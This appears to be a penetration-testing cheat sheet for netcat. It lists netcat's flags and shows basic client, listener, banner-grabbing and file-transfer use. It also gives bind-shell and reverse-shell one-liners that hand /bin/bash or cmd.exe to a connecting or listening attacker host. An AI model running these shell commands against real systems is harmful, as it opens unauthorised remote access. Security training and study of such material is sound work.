# Netcat

* TCP protocol
* no encryption for data transmitted

#### netcat important parameters

> -l: Listen mode  
> -e: Program to execute after connection occurs  
> -n: Don't perform DNS lookups on names of machines on the other side  
> -v: verbose, printing out messages on Standard Error, such as when a connection occurs

#### Basic usage

##### Fundamental Client \(\#1\)

> nc \[ip address\] \[port\]

##### Fundamental Listener \(\#2\)

> nc -l -p \[port\]

#### Backdoor Shell

##### Bind Shell

Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The **attacker then connects to the victim** machine’s listener which then leads to code or command execution on the server.

![](/assets/bind_shell.png)

###### netcat client (#1) on **attacking machine** to access the shell

######Command Execute on Victim Machine
######Linux
> nc -l -p \[port\] -e /bin/bash

######Windows
> C:\> nc -l -p \[port\] -e cmd.exe

##### Reverse Shell

A reverse shell is a type of shell in which the target machine **communicates back** to the attacking machine. The attacking machine has a listener port on which it receives the connection, which by using, code or command execution is achieved.

![](/assets/reverseshell.png)

###### netcat listener (#2) on **attacking machine** to capture the shell

######Command Execute on Victim Machine
######Linux
>nc \[attacker ip\] \[attacker listen port\] -e /bin/bash

######Windows
> C:\> nc \[attacker ip\] \[attacker listen port\] -e cmd.exe

#### TCP Banner Grabbing

> echo "" \| nc -v -n -w1 \[IP Address\] \[Ports\]
>
> echo -e "HEAD / HTTP/1.0\n\n" \| nc 192.168.2.22 80

#### Transferring a File

##### Push a file from client to listener

Receiving ends:

> nc -l -p \[port\] **&gt;** \[filename to be saved\]

Sending ends:

> nc -w3 \[ip address\] \[port\] **&lt;** \[file to be send\]

##### Pull a file from listener back to client

File host:

> nc -l -p \[port\] &lt; \[file to be pulled\]

Pulling ends:

> nc -w3 \[ip address\] \[port\] **&gt;** \[file to be retrieve\]
